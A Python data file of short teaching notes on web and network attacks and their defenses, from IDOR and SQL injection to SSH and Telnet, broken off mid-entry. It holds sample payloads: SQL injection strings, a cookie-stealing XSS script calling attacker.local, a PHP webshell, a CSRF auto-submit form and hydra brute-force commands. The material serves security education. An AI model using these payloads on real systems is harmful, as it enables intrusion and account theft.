import os

NOTES_DATA = [
    # ACCESS
    {
        "slug": "idor",
        "title": "Insecure Direct Object References (IDOR)",
        "symbol": "ID",
        "category": "Access",
        "readTime": 2,
        "tldr": "The application trusts the ID in the request and never verifies if the record belongs to the user.",
        "red": "Change an ID parameter in the URL or request body to view or modify someone else's private data.",
        "blue": "Enforce strict server-side authorization checks verifying that the requesting session owns the targeted record.",
        "next": "privilege-escalation",
        "content": """### What is IDOR?
Insecure Direct Object Reference (IDOR) happens when an application exposes a direct reference to an internal database object—such as an account number, user ID, or invoice ID—directly in the URL or request body, without checking if the logged-in user actually has permission to access that object.

The server simply receives the request, sees an ID number, queries the database, and returns the result. It mistakenly assumes that having the link means you have the right to view it.

### How it looks in practice
Imagine you log into your student portal and open your fee invoice. The URL looks like this:

```http
GET /api/invoices/1042 HTTP/1.1
Host: school.portal
Cookie: session=kavy_logged_in
```

An attacker notices the numeric identifier `1042`. What happens if they increment the number to `1043`?

```http
GET /api/invoices/1043 HTTP/1.1
Host: school.portal
Cookie: session=kavy_logged_in
```

If the backend only checks "Is this user logged in?" rather than "Does invoice 1043 belong to Kavy?", the server returns another student's full invoice, including their address and payment details.

### Why this happens
Developers often confuse authentication with authorization:
- **Authentication**: "Do I know who you are?" (Yes, you logged in with valid credentials).
- **Authorization**: "Are you allowed to see this specific record?" (Often forgotten in backend query logic).

### How to defend against it
1. **Server-side ownership verification**: On every read, update, or delete operation, join the query with the authenticated session's user ID:
   ```sql
   SELECT * FROM invoices WHERE invoice_id = ? AND account_id = ?;
   ```
2. **Use indirect references**: Instead of exposing raw database integers, map temporary random tokens (GUIDs/UUIDs) to session state on the server.
3. **Never trust client parameters**: Do not let client-side JavaScript or hidden input fields dictate object access rights."""
    },
    {
        "slug": "privilege-escalation",
        "title": "Privilege Escalation",
        "symbol": "PE",
        "category": "Access",
        "readTime": 2,
        "tldr": "A normal user bypasses access controls to gain administrative power or reach another user's level.",
        "red": "Tamper with role parameters, manipulate session cookies, or abuse misconfigured server permissions to act as an admin.",
        "blue": "Enforce role-based access control (RBAC) on the server for every endpoint and apply least privilege everywhere.",
        "next": "header-tricks",
        "content": """### What is Privilege Escalation?
Privilege escalation occurs when an attacker obtains permissions that were never intended for their account level. It comes in two primary forms:
- **Horizontal**: Accessing resources that belong to another user with the exact same privilege tier (e.g. user A reading user B's messages).
- **Vertical**: Jumping from a low-privilege tier (e.g. guest or student) to a high-privilege tier (e.g. administrator or root).

### How it looks in practice
In web applications, vertical privilege escalation often happens when developers trust user-supplied profile data during account updates:

```http
POST /api/user/update HTTP/1.1
Host: target.local
Content-Type: application/json

{
  "username": "kavy",
  "email": "kavy@mail.local",
  "role": "admin"
}
```

If the backend blindly unpacks the JSON object into the user model without a parameter allowlist (mass assignment), the user's role is updated to `admin` in the database.

In Linux operating systems, privilege escalation frequently happens through misconfigured SUID binaries or overly permissive `sudo` rights:

```bash
# Check binaries running with root privileges
find / -perm -4000 2>/dev/null
```

If a standard binary like `/usr/bin/python` or `/usr/bin/find` has the SUID bit set, a standard shell user can immediately spawn a root shell.

### Key takeaways
1. **Never trust client-submitted roles**: The client should never dictate its own authorization level. Role assignment must only happen through dedicated, restricted administrative APIs.
2. **Deny by default**: When a new API route or admin panel is deployed, access should be blocked by default unless explicitly granted to verified admin roles.
3. **Audit operating system permissions**: Regularly review `sudoers` files and SUID bits to ensure binaries do not give unprivileged users a route to root."""
    },
    {
        "slug": "header-tricks",
        "title": "Header Tricks & Reverse Proxy Bypasses",
        "symbol": "HT",
        "category": "Access",
        "readTime": 2,
        "tldr": "Injecting spoofed HTTP headers fools front-end proxies into believing requests come from localhost.",
        "red": "Send fake headers like X-Forwarded-For or X-Original-URL to bypass IP restrictions and access hidden panels.",
        "blue": "Configure front-end proxies to strip client-supplied headers and enforce authorization at the application layer.",
        "next": "sql-injection",
        "content": """### What are Header Tricks?
Modern web architectures place a reverse proxy, load balancer, or Web Application Firewall (WAF) in front of the actual application server. The proxy inspects the traffic and forwards legitimate requests to the backend.

During this process, proxies often append custom HTTP headers to tell the backend about the original client, such as `X-Forwarded-For` or `X-Real-IP`. If the backend blindly trusts these headers without verifying they came from a trusted proxy, an attacker can forge them directly.

### How it looks in practice
Consider an administrative panel at `/admin` that only allows connections from the local machine (`127.0.0.1`). When accessed externally, the server responds with:

```http
HTTP/1.1 403 Forbidden
Content-Type: text/plain

Access denied: Admin panel only accessible from localhost.
```

An attacker intercepts the request in Burp Suite and adds custom headers claiming the request originated from the server itself:

```http
GET /admin HTTP/1.1
Host: internal.portal
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
```

If the backend framework checks `request.headers['X-Forwarded-For']` before checking the physical socket IP, it assumes the request is local and serves the administrative dashboard.

Another common trick involves URL override headers:
```http
GET / HTTP/1.1
Host: target.local
X-Original-URL: /admin/users
```
The front-end proxy sees a benign request to `/` and lets it pass. The backend reads `X-Original-URL`, executes the admin endpoint, and bypasses the proxy's path rules.

### How to defend against it
1. **Strip untrusted headers**: The ingress reverse proxy must explicitly strip or overwrite all `X-Forwarded-*` headers coming from external clients.
2. **Never rely on headers for authentication**: Use robust session tokens and mutual TLS rather than IP-based allowlists for sensitive administrative routes."""
    },

    # INJECTION
    {
        "slug": "sql-injection",
        "title": "SQL Injection (SQLi)",
        "symbol": "Sq",
        "category": "Injection",
        "readTime": 2,
        "tldr": "Untrusted input gets concatenated into a database query, allowing attackers to change the query logic.",
        "red": "Inject quotes and SQL keywords to dump database tables, bypass logins, or read private credentials.",
        "blue": "Use parameterized queries (prepared statements) for all database operations so input is never parsed as code.",
        "next": "blind-sqli",
        "content": """### What is SQL Injection?
SQL Injection occurs when user-supplied input is directly concatenated into a dynamic SQL query string instead of being passed as a separate data parameter. Because the database engine cannot distinguish between the developer's instructions and the user's data, an attacker can break the query syntax and run their own commands.

### How it looks in practice
Consider a vulnerable login authentication check:

```python
# Vulnerable string formatting
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

If an attacker enters the following payload into the username field:
```sql
admin' OR 1=1--
```

The resulting query executed by the database engine becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1--' AND password = '...'
```

Here is what happens:
1. The quote (`'`) closes the username string literal.
2. `OR 1=1` is evaluated. Because `1=1` is always true, the entire `WHERE` clause evaluates to true.
3. The double hyphen (`--`) comments out the remainder of the query, completely ignoring the password check.
4. The database returns the first record (usually the administrator account), and the attacker logs in without a password.

In data retrieval endpoints, UNION-based injection is used to append results from other tables:
```sql
' UNION SELECT null, username, password FROM users--
```

### Why string filtering fails
Trying to fix SQL injection by replacing `'` or filtering words like `SELECT` is fragile. Attackers bypass filters using alternative encodings, URL encoding, or nested keywords (`SELSELECTECT`).

### How to defend against it
Always use parameterized queries (prepared statements):

```python
# Secure parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```
The database pre-compiles the query structure first. User input is treated strictly as literal data, making injection mathematically impossible."""
    },
    {
        "slug": "blind-sqli",
        "title": "Blind SQL Injection",
        "symbol": "Bq",
        "category": "Injection",
        "readTime": 2,
        "tldr": "When the application returns no SQL errors or data, you extract information using true/false checks or time delays.",
        "red": "Send conditional boolean queries or database sleep commands to reconstruct secrets character by character.",
        "blue": "Use parameterized queries everywhere and log unexpected query patterns on backend servers.",
        "next": "xss",
        "content": """### What is Blind SQL Injection?
In classic SQL injection, database records or error messages appear directly on the web page. But in many production applications, developers suppress detailed error messages and return a generic "Welcome back" or "Item not found" page.

Even when no database data is visible on screen, the vulnerability still exists. This is called **Blind SQL Injection**. An attacker extracts data by asking the database a series of yes-or-no questions.

### The two main types

#### 1. Boolean-based Blind SQLi
The application returns slightly different content depending on whether a subquery evaluates to true or false.

```sql
# Check if the first character of the admin password is 'a'
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```
- If the first letter is indeed 'a', the query is true, and the page shows "User active".
- If it is not 'a', the query is false, and the page shows "User not found".
By automating this check across all characters (A-Z, 0-9), the attacker extracts the complete password.

#### 2. Time-based Blind SQLi
Sometimes the page response is completely identical regardless of true or false. In this scenario, the attacker forces the database to pause execution when a condition is met:

```sql
# PostgreSQL payload
' UNION SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```
If the server takes 5 seconds longer to respond, the condition was true. If it responds instantly, the condition was false.

### How to defend against it
The defense is identical to standard SQL injection:
1. **Parameterized queries**: Parameterization completely prevents the database from executing injected boolean logic or sleep functions.
2. **Generic error responses**: Keep error messages generic, but never rely on obscurity as a substitute for secure query parameterization."""
    },
    {
        "slug": "xss",
        "title": "Cross-Site Scripting (XSS)",
        "symbol": "Xs",
        "category": "Injection",
        "readTime": 2,
        "tldr": "Malicious JavaScript gets injected into a web page and executes in the browsers of visiting users.",
        "red": "Inject script tags to steal session cookies, capture keystrokes, or redirect users to credential harvesting sites.",
        "blue": "Contextually encode all user output before rendering and enforce strict Content Security Policy (CSP).",
        "next": "path-traversal",
        "content": """### What is XSS?
Cross-Site Scripting (XSS) occurs when an application includes untrusted user data in a web page without properly validating or encoding it. As a result, the victim's browser treats the user input as executable code rather than plain text.

Because the injected script runs inside the victim's authenticated session, it has full access to the Document Object Model (DOM), local storage, and session cookies.

### The three primary types

#### 1. Stored XSS
The malicious script is permanently stored in the application's database (for example, in a blog comment or user profile field). Whenever another user views the profile, the script executes automatically.

#### 2. Reflected XSS
The payload is delivered inside a request parameter (such as a search query) and reflected immediately in the server response:
```http
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
```
If the search results page renders `Results for: <script>...`, the script executes.

#### 3. DOM-based XSS
The vulnerability exists entirely within client-side JavaScript. Untrusted data from a "source" (like `location.hash`) is passed into an unsafe "sink" (like `element.innerHTML` or `eval()`) without server involvement.

### A tiny proof of concept
An attacker submits this comment on a message board:
```html
<script>
  fetch('https://attacker.local/steal?c=' + encodeURIComponent(document.cookie));
</script>
```
When the site administrator views the comment, their session cookie is silently transmitted to the attacker's server, enabling full account takeover.

### How to defend against it
1. **Context-aware output encoding**: Escape characters like `<`, `>`, `&`, `"`, and `'` so the browser renders them as characters rather than HTML tags (`&lt;`, `&gt;`).
2. **HttpOnly cookie flag**: Set the `HttpOnly` attribute on session cookies so JavaScript cannot read them via `document.cookie`.
3. **Content Security Policy (CSP)**: Deploy a strict CSP header restricting where scripts can be loaded and executed from."""
    },

    # FILES
    {
        "slug": "path-traversal",
        "title": "Path Traversal (Directory Traversal)",
        "symbol": "Pt",
        "category": "Files",
        "readTime": 2,
        "tldr": "Using dot-dot-slash sequences to walk out of the restricted web folder and read private server files.",
        "red": "Pass ../ sequences in file parameters to read sensitive operating system configuration files like /etc/passwd.",
        "blue": "Validate filenames against a strict allowlist and resolve canonical paths to verify they stay in the base folder.",
        "next": "file-upload",
        "content": """### What is Path Traversal?
Path Traversal (also known as Directory Traversal or `../` manipulation) allows an attacker to read arbitrary files stored on the server file system. It happens when an application accepts a filename or path from user input and passes it directly to file-system APIs without ensuring the path stays within the intended root folder.

### How it looks in practice
Consider an image viewing script:
```http
GET /loadImage?filename=logo.png HTTP/1.1
Host: shop.local
```

On the backend, the developer wrote:
```python
# Insecure file retrieval
file_path = "/var/www/shop/images/" + filename
with open(file_path, "rb") as f:
    return f.read()
```

An attacker modifies the request using directory traversal sequences:
```http
GET /loadImage?filename=../../../../etc/passwd HTTP/1.1
Host: shop.local
```

The operating system resolves the path:
1. `/var/www/shop/images/`
2. `..` &rarr; `/var/www/shop/`
3. `..` &rarr; `/var/www/`
4. `..` &rarr; `/var/`
5. `..` &rarr; `/`
6. `etc/passwd` &rarr; `/etc/passwd`

The server opens `/etc/passwd` and returns the operating system user accounts to the client.

### Common bypass techniques
Developers often try naive string replacements, which attackers easily evade:
- **Nested sequences**: If the code strips `../`, an attacker sends `....//`. When the inner `../` is removed, the remaining characters reform `../`.
- **URL encoding**: `%2e%2e%2f` (URL encoded) or `%252e%252e%252f` (double encoded).
- **Null byte injection**: In older runtimes, appending `%00` truncated appended file extensions.

### How to defend against it
1. **Resolve and verify canonical paths**:
   ```python
   import os
   base_dir = os.path.abspath("/var/www/shop/images")
   target_path = os.path.abspath(os.path.join(base_dir, user_input))
   if not target_path.startswith(base_dir):
       raise ValueError("Access Denied: Path outside base directory")
   ```
2. **Use an allowlist or database index**: Store files using random alphanumeric IDs and map them to physical paths in a database."""
    },
    {
        "slug": "file-upload",
        "title": "File Upload Vulnerabilities",
        "symbol": "Fu",
        "category": "Files",
        "readTime": 2,
        "tldr": "Uploading executable scripts disguised as images allows attackers to run commands on the web server.",
        "red": "Bypass extension and MIME checks to upload a webshell, then trigger it through the browser for remote code execution.",
        "blue": "Store uploads outside the web root, re-encode images, randomize file names, and disable script execution in upload folders.",
        "next": "broken-authentication",
        "content": """### What are File Upload Vulnerabilities?
Many applications let users upload files—such as avatars, resumes, or receipts. If the application accepts files without thoroughly verifying what they contain and stores them in a web-accessible directory, an attacker can upload an executable script (a **webshell**) and gain full remote code execution.

### How it looks in practice
A profile page has an avatar upload form. An attacker creates a tiny PHP script named `shell.php`:

```php
<?php
// Tiny webshell
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

The attacker uploads `shell.php`. The server accepts it and responds:
```json
{"status": "success", "url": "/uploads/avatars/shell.php"}
```

Now the attacker opens the uploaded file in their browser:
```http
GET /uploads/avatars/shell.php?cmd=id HTTP/1.1
```
The web server (Apache or Nginx) executes the PHP code and returns the server's user ID (`uid=33(www-data)`). The attacker now has an interactive shell.

### Common filter bypasses
- **Alternative extensions**: If `.php` is blocked, servers often still execute `.phtml`, `.php5`, `.phar`, or `.inc`.
- **MIME-type manipulation**: Changing `Content-Type: application/x-php` to `Content-Type: image/jpeg` in the HTTP request body fools naive checks.
- **Magic bytes**: Prepending valid image headers (`GIF89a;`) to the beginning of a script file bypasses file-inspection libraries.
- **Double extensions**: `avatar.php.png` or `avatar.php%00.png`.

### How to defend against it
1. **Store outside the web root**: Store uploaded files in an isolated private directory or object storage bucket (e.g. S3) that cannot be executed by the web server.
2. **Re-encode media files**: Do not store original uploaded byte streams directly. Load images through an image library and re-save them as clean PNGs or JPEGs.
3. **Randomize filenames**: Replace the user's filename with a generated UUID and assign the extension based on verified file content, not client headers."""
    },

    # AUTH
    {
        "slug": "broken-authentication",
        "title": "Broken Authentication",
        "symbol": "Ba",
        "category": "Auth",
        "readTime": 2,
        "tldr": "Flaws in login flows, session handling, or credential storage allow attackers to hijack user accounts.",
        "red": "Brute-force weak credentials, exploit uninvalidated session tokens, or bypass password reset verification.",
        "blue": "Enforce rate limiting, require multi-factor authentication, hash passwords with Argon2, and regenerate session IDs on login.",
        "next": "csrf",
        "content": """### What is Broken Authentication?
Broken Authentication refers to vulnerabilities in how an application verifies user identity and manages active sessions. When authentication mechanisms are poorly implemented, attackers can compromise passwords, session tokens, or user accounts, gaining the ability to impersonate legitimate users.

### Common authentication weaknesses

#### 1. Credential Stuffing & Brute Force
If a login form lacks rate limiting or account lockout controls, an attacker can use tools like Hydra or Burp Intruder to test thousands of username and password combinations against the endpoint.

#### 2. Session Fixation
When a user visits a site before logging in, they receive an anonymous session ID. If the application continues using that exact same session ID after the user successfully logs in, an attacker who previously knew that ID inherits the authenticated session.

#### 3. Predictable Password Reset Tokens
If password reset links use predictable numbers or sequential timestamps:
```http
https://target.local/reset?token=1708459200
```
An attacker can calculate the token generated for an administrator account and reset their password.

### Key takeaways
- **Passwords must never be stored in plain text or MD5**: Always use modern, slow, memory-hard hashing algorithms like Argon2id or bcrypt with appropriate work factors.
- **Session IDs must be unpredictable**: Session tokens must be cryptographically secure random values with sufficient entropy (at least 128 bits).

### How to defend against it
1. **Regenerate session tokens on login**: Always destroy pre-login session cookies and issue a completely fresh session identifier upon successful authentication.
2. **Rate limit sensitive endpoints**: Implement progressive delays, CAPTCHAs, or IP-based rate limiting on `/login` and `/reset-password` endpoints.
3. **Multi-Factor Authentication (MFA)**: Require a secondary verification factor (such as TOTP authenticator apps) for sensitive operations."""
    },
    {
        "slug": "csrf",
        "title": "Cross-Site Request Forgery (CSRF)",
        "symbol": "Cs",
        "category": "Auth",
        "readTime": 2,
        "tldr": "A malicious site tricks an authenticated user's browser into submitting unauthorized actions.",
        "red": "Craft a hidden HTML form that automatically submits state-changing requests using the victim's saved session cookies.",
        "blue": "Require unpredictable Anti-CSRF tokens for all state-changing requests and configure SameSite cookie attributes.",
        "next": "business-logic",
        "content": """### What is CSRF?
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. 

Browsers automatically include saved session cookies with every HTTP request sent to a given domain—even when the request was initiated by an external, untrusted website. If an application relies solely on cookies for authorization, a third-party site can forge legitimate-looking requests on behalf of the user.

### How it looks in practice
Imagine you are logged into your webmail or banking portal at `bank.local`. The portal lets users transfer money via an HTTP POST request:

```http
POST /transfer HTTP/1.1
Host: bank.local
Cookie: session=authenticated_user_session

recipient=attacker&amount=500
```

An attacker sets up a malicious website with a hidden form:

```html
<!-- Hosted on attacker.com -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://bank.local/transfer" method="POST">
      <input type="hidden" name="recipient" value="attacker" />
      <input type="hidden" name="amount" value="500" />
    </form>
  </body>
</html>
```

If you visit `attacker.com` while your session on `bank.local` is still active, your browser automatically submits the form, attaches your valid `bank.local` cookie, and transfers the funds without your knowledge.

### How to defend against it
1. **Anti-CSRF Tokens**: Include a unique, unpredictable, and cryptographically strong token in every state-changing form:
   ```html
   <input type="hidden" name="csrf_token" value="d9f48a1b3c7e8..." />
   ```
   The server checks that the token matches the value stored in the user's session. Since `attacker.com` cannot read the victim's token due to the Same-Origin Policy, forged requests are rejected.
2. **SameSite Cookie Attribute**: Set `SameSite=Strict` or `SameSite=Lax` on session cookies. This instructs modern browsers not to attach session cookies to cross-site requests."""
    },

    # LOGIC
    {
        "slug": "business-logic",
        "title": "Business Logic Vulnerabilities",
        "symbol": "Bl",
        "category": "Logic",
        "readTime": 2,
        "tldr": "The application functions exactly as coded, but the coded rules contain flawed assumptions that can be abused.",
        "red": "Manipulate parameters, skip mandatory checkout steps, or enter negative numbers to bypass business restrictions.",
        "blue": "Model system invariants, validate state machines on the server, and write positive integration tests for edge cases.",
        "next": "race-conditions",
        "content": """### What are Business Logic Flaws?
Unlike SQL injection or buffer overflows, Business Logic vulnerabilities do not stem from bad syntax or missing sanitization. The software functions exactly as the developer wrote it—but the developer made flawed assumptions about how users would interact with the application.

Automated vulnerability scanners rarely detect business logic flaws because scanners understand technical syntax, not human intent or domain rules.

### How it looks in practice
Here are three common real-world examples:

#### 1. Negative numbers in carts
An e-commerce store accepts item quantities:
```http
POST /cart/add HTTP/1.1
Host: shop.local

{"item_id": 42, "price": 100, "quantity": -2}
```
If the backend calculates `total = price * quantity`, adding a negative quantity reduces the total cart balance. By combining a real purchase with a negative item, an attacker can reduce the total cart cost to $1.

#### 2. Price parameter tampering
A web application trusts client-side price values sent in HTTP requests:
```http
POST /checkout HTTP/1.1
Host: shop.local

{"item": "Laptop", "amount": 1}
```
If the backend does not look up the official item price from the database and instead trusts the JSON payload, the order completes at the modified price.

#### 3. Skipping mandatory steps
In a multi-step registration or password reset flow:
- Step 1: Request reset code.
- Step 2: Verify code via SMS.
- Step 3: Enter new password.
If an attacker navigates directly to Step 3 (`/reset/set-password`) without completing Step 2, and the server fails to verify that Step 2 was completed, the reset completes without verification.

### How to defend against it
1. **Server-side authority**: Never trust client-submitted prices, discounts, or state flags. Always retrieve authoritative prices directly from backend database tables.
2. **Enforce state machines**: Verify that step N cannot be executed unless step N-1 has been verified and recorded in the session ledger."""
    },
    {
        "slug": "race-conditions",
        "title": "Race Conditions",
        "symbol": "Rc",
        "category": "Logic",
        "readTime": 2,
        "tldr": "Sending multiple requests in parallel exploits the timing window between checking a balance and deducting it.",
        "red": "Send simultaneous requests with tools like Turbo Intruder to redeem a single-use coupon or gift card multiple times.",
        "blue": "Use database transactions with row-level locks or mutexes to ensure balance updates are strictly atomic.",
        "next": "tcp-vs-udp",
        "content": """### What is a Race Condition?
A Race Condition occurs when multiple concurrent execution threads access and modify shared resources without proper synchronization. In web applications, this frequently takes the form of a **Time-of-Check to Time-of-Use (TOCTOU)** flaw.

The application first checks: "Is this coupon valid?" If yes, it proceeds to apply the discount, and only then marks the coupon as used. If an attacker sends twenty requests in the exact same millisecond, all twenty requests pass the check before any of them updates the database.

### How it looks in practice
Consider a coupon redemption endpoint:

```python
# Vulnerable sequence
def apply_coupon(user, coupon_code):
    coupon = db.get_coupon(coupon_code)
    if not coupon.is_used:                 # 1. Check
        user.apply_discount(coupon.value)  # 2. Use
        coupon.is_used = True              # 3. Update status
        db.save(coupon)
```

If an attacker sends 30 simultaneous requests using Burp Suite's Turbo Intruder:
1. All 30 requests hit Step 1 simultaneously.
2. For all 30 threads, `coupon.is_used` is still `False`.
3. All 30 threads execute Step 2, granting 30 discounts.
4. Finally, Step 3 executes, but the damage is already done.

The attacker successfully applies a single-use $20 coupon 30 times, reducing an expensive cart balance to zero.

### Other common targets
- Withdrawing funds from account balances.
- Voting systems where a user is limited to one vote per poll.
- Claiming limited inventory items during flash sales.

### How to defend against it
1. **Atomic database operations**: Ensure check-and-update occurs in a single atomic SQL statement:
   ```sql
   UPDATE coupons SET is_used = TRUE WHERE code = ? AND is_used = FALSE;
   ```
   If zero rows were affected, the coupon has already been claimed.
2. **Pessimistic locking**: Wrap operations in database transactions with row-level locks (`SELECT ... FOR UPDATE`)."""
    },

    # NETWORK
    {
        "slug": "tcp-vs-udp",
        "title": "TCP vs UDP",
        "symbol": "Tu",
        "category": "Network",
        "readTime": 2,
        "tldr": "TCP guarantees reliable delivery with a 3-way handshake; UDP prioritizes raw speed without connection state.",
        "red": "Abuse connectionless UDP services for spoofed reflection DDoS attacks, or exhaust TCP state tables with SYN floods.",
        "blue": "Deploy SYN cookies for TCP services, rate-limit UDP amplification ports, and enforce stateful firewall inspection.",
        "next": "nmap-scripts",
        "content": """### The Two Pillars of Transport
At Layer 4 of the OSI model, TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) dictate how packets travel across networks. Understanding the architectural differences between them is essential for network reconnaissance and penetration testing.

### TCP: Reliable & Connection-Oriented
TCP establishes a verified connection before transmitting any user data. It uses a **3-Way Handshake**:

```
Client                     Server
  | ----- SYN (seq=x) ----> |  "Can we talk?"
  | <--- SYN-ACK (ack=x+1) -|  "Yes, I hear you."
  | ----- ACK (ack=y+1) --->|  "Great, let's begin."
```

- **Features**: Ordered delivery, error checking, retransmission of lost packets, and flow control.
- **Common protocols**: HTTP/HTTPS (80/443), SSH (22), FTP (21), SMTP (25).
- **Security implication**: Because the server allocates memory for half-open connections during the handshake, attackers can launch **SYN Flood** attacks, exhausting the server's connection backlog table.

### UDP: Fast & Connectionless
UDP does not establish a handshake, track connection state, or verify delivery. It simply sends datagrams directly to the destination address:
- **Features**: Low latency, minimal overhead, no retransmissions.
- **Common protocols**: DNS (53), DHCP (67/68), SNMP (161), streaming media, VoIP.
- **Security implication**: Because UDP does not verify source IP addresses, attackers can easily spoof the sender IP. In **Amplification DDoS attacks**, attackers send tiny requests with a spoofed target IP to open DNS or NTP servers, causing the servers to flood the victim with large responses.

### Key takeaways
1. **TCP port scanning** (like `nmap -sT` or `-sS`) looks for SYN-ACK responses to identify open services.
2. **UDP port scanning** (like `nmap -sU`) is much slower because open ports often do not respond at all unless queried with application-specific probes."""
    },
    {
        "slug": "nmap-scripts",
        "title": "Nmap & Scripting Engine (NSE)",
        "symbol": "Nm",
        "category": "Network",
        "readTime": 2,
        "tldr": "Nmap maps open ports and running daemons; NSE scripts automate vulnerability detection and service checks.",
        "red": "Run targeted scripts (-sC, --script vuln) to discover exposed services, default accounts, and known CVEs.",
        "blue": "Scan your own perimeter with Nmap, disable banner disclosure, and restrict scanning visibility with firewalls.",
        "next": "ftp",
        "content": """### What is Nmap?
Nmap (Network Mapper) is the foundational tool for network reconnaissance. It identifies live hosts, open ports, listening service daemons, and operating system fingerprints.

Beyond basic port scanning, Nmap includes the **Nmap Scripting Engine (NSE)**—a powerful Lua-based scripting framework that automates tasks ranging from advanced service enumeration to vulnerability exploitation.

### Essential scanning flags
In everyday penetration testing and lab practice, these flags form the core toolkit:

```bash
# Comprehensive service & OS scan with default scripts
nmap -sC -sV -oN scan_results.txt <target_ip>
```
- `-sS`: Stealth SYN scan. Sends SYN packets and tears down the connection upon receiving SYN-ACK without completing the full handshake.
- `-sV`: Version detection. Probes open ports to determine the exact software banner and version.
- `-sC`: Runs default NSE scripts (equivalent to `--script=default`).
- `-p-`: Scans all 65,535 ports instead of just the top 1,000 common ports.

### Leveraging the Nmap Scripting Engine (NSE)
NSE scripts are grouped into categories such as `auth`, `vuln`, `discovery`, and `safe`.

#### 1. Checking for anonymous FTP
```bash
nmap --script ftp-anon -p 21 <target_ip>
```
If anonymous access is permitted, Nmap logs in and lists the root directory.

#### 2. Scanning for known CVEs
```bash
nmap --script vuln -p 80,443 <target_ip>
```
Nmap tests open web ports against known vulnerability signatures and reports CVE identifiers.

### Key takeaways
- **Scan all ports**: Attackers and administrators often run sensitive services on non-standard ports (e.g. running SSH on port 2222 or HTTP on 8080).
- **Audit your own assets**: Use Nmap regularly to verify that unexpected ports are not inadvertently exposed to the internet."""
    },
    {
        "slug": "ftp",
        "title": "FTP (File Transfer Protocol)",
        "symbol": "Ft",
        "category": "Network",
        "readTime": 2,
        "tldr": "Legacy file transfer service on port 21, frequently misconfigured with unauthenticated anonymous access.",
        "red": "Connect as user 'anonymous' to read sensitive backups, source code, or upload files into web directories.",
        "blue": "Disable anonymous access, enforce SFTP (over SSH) with key authentication, and retire plaintext FTP daemons.",
        "next": "ssh",
        "content": """### What is FTP?
FTP (File Transfer Protocol) is an old application-layer protocol running on port 21 designed for uploading and downloading files between clients and servers.

FTP was designed before modern network encryption standards existed. By default, it transmits all commands, filenames, usernames, and passwords across the network in clear, unencrypted text.

### How it looks in practice
During network enumeration, Nmap frequently uncovers port 21:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```

A common security misconfiguration in FTP servers is **Anonymous Access**. Many server configurations allow users to log in using the username `anonymous` without needing a verified account:

```bash
ftp <target_ip>
Connected to <target_ip>.
220 (vsftpd 3.0.3)
Name (<target_ip>:kavy): anonymous
331 Please specify the password.
Password: <enter or blank>
230 Login successful.
Remote system type is UNIX.
```

Once connected, an attacker uses standard FTP commands:
- `ls`: List files in the directory.
- `get filename.txt`: Download a file to the local machine.
- `put file.php`: Upload a file to the remote server.

If the FTP root folder coincides with an Apache web folder (such as `/var/www/html`), an attacker who can upload files can place a webshell on the server and trigger it via HTTP, escalating from file transfer to full system control.

### How to defend against it
1. **Disable anonymous login**: In `/etc/vsftpd.conf`, set:
   ```ini
   anonymous_enable=NO
   ```
2. **Decommission plaintext FTP**: Replace FTP with SFTP (SSH File Transfer Protocol) running over port 22, which encrypts both credentials and data payloads."""
    },
    {
        "slug": "ssh",
        "title": "SSH (Secure Shell)",
        "symbol": "Ss",
        "category": "Network",
        "readTime": 2,
        "tldr": "Encrypted remote administration service on port 22; weak passwords and leaked private keys are the primary attack vectors.",
        "red": "Brute-force weak administrative credentials or locate exposed private keys (id_rsa) to obtain interactive shell access.",
        "blue": "Disable password authentication, enforce ed25519 public key pairs, disable root login, and rate-limit with fail2ban.",
        "next": "telnet",
        "content": """### What is SSH?
SSH (Secure Shell) is the industry-standard cryptographic network protocol running on port 22. It replaced insecure plaintext protocols like Telnet and rlogin, providing encrypted terminal access, command execution, and file transfer across untrusted networks.

SSH uses public-key cryptography to authenticate the remote host and optionally authenticate the connecting user.

### Primary attack vectors against SSH

#### 1. Weak passwords & brute-force attacks
If an SSH daemon permits password authentication, attackers use automated dictionaries to test common credentials:
```bash
hydra -l root -P passwords.txt ssh://<target_ip>
```
If an administrative account uses a weak password, the attacker obtains an immediate root shell.

#### 2. Leaked private keys (id_rsa)
In many CTF challenges and real penetration tests, initial access to an unprivileged web shell or exposed backup share reveals an unprotected private key:
```bash
# Locate private SSH keys
find / -name "id_rsa" 2>/dev/null
```
If the key file has permissions set to `600`, an attacker can download it and connect directly without entering a password:
```bash
chmod 600 id_rsa
ssh -i id_rsa user@<target_ip>
```

### Hardening SSH: Best practices
To secure an SSH daemon against common attacks, edit `/etc/ssh/sshd_config`:

1. **Disable password logins**: Force users to authenticate using public key pairs:
   ```ini
   PasswordAuthentication no
   ```
2. **Disable direct root logins**: Prevent attackers from targeting the `root` account:
   ```ini
   PermitRootLogin no
   ```
3. **Use modern key algorithms**: Prefer modern, compact `ed25519` keys over legacy 1024-bit RSA keys:
   ```bash
   ssh-keygen -t ed25519
   ```
4. **Deploy fail2ban**: Automatically ban IP addresses that generate repeated failed authentication attempts."""
    },
    {
        "slug": "telnet",
        "title": "Telnet",
        "symbol": "Tn",
        "category": "Network",
        "readTime": 2,
        "tldr": "Ancient unencrypted terminal protocol on port 23; transmits all commands and passwords in clear plaintext.",
        "red": "Sniff unencrypted credentials across network segments or connect directly to exploit unauthenticated root logins.",
        "blue": "Disable Telnet services completely and migrate all remote administration to modern SSH.",
        "next": "dns",
        "content": """### What is Telnet?
Telnet is one of the earliest network terminal protocols, developed in 1969 and assigned port 23. It provides a bidirectional, text-oriented communication facility over TCP connections.

While Telnet was widely used in early computing, it lacks any form of cryptographic security. All keystrokes, commands, usernames, and passwords are transmitted over the network in clear, readable plaintext.

### Why Telnet is dangerous
Anyone on the local network path (or an attacker performing an ARP spoofing attack) can intercept the traffic with Wireshark or tcpdump and read every character typed by the user:

```
Packet bytes:
